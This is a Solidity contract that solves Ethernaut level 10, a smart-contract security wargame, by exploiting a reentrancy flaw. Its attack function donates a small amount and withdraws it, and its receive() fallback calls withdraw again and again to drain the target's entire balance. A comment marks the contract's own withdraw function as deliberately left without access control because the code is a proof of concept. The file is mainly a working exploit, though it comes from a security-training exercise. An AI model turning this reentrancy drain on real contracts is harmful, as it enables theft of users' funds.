// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

interface IReentrancy {
    function withdraw(uint _amount) external;
    function donate(address _to) external payable;
}

contract Cracked10_Reentrancy {
    address ethernaut_contracts;
    uint256 donateValue = 0.001 ether;

    constructor(address payable _address) public payable {
        ethernaut_contracts = _address;
    }

    function attach() public payable {
        IReentrancy(ethernaut_contracts).donate{value: donateValue}(address(this));
        IReentrancy(ethernaut_contracts).withdraw(donateValue);
    }

    //poc用，不限制权限
    function withdraw() public {
        (bool result, ) = msg.sender.call{value: address(this).balance}("");
        require(result, "draw fail");
    }

    receive() external payable {
        if (address(ethernaut_contracts).balance >= donateValue) IReentrancy(ethernaut_contracts).withdraw(donateValue);

        if (address(ethernaut_contracts).balance > 0 && address(ethernaut_contracts).balance < donateValue) IReentrancy(ethernaut_contracts).withdraw(address(ethernaut_contracts).balance);
    }
}
